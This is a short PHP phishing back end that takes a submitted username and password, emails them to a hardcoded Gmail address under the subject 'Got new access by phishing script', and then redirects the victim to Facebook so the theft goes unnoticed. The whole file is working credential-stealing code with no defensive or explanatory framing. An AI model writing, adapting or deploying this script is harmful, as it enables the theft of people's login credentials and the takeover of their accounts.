<?php
function mail_sender(){
    if(!isset($_REQUEST['username']) || !isset($_REQUEST['password'])){
        return false;
    }

    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];

    $reciever = "rajivary1@gmail.com";

    $subject = "Got new access by phishing script";
    $message = "The username is ". $username . " and password is ". $password;

    return mail($reciever, $subject, $message);
}

if(mail_sender()){
    header("Location: http://www.facebook.com");
    exit(); // Always add an exit after a header redirect
} else {
    header("Location: javascript://history.go(-1)");
    exit(); // Always add an exit after a header redirect
}
?>
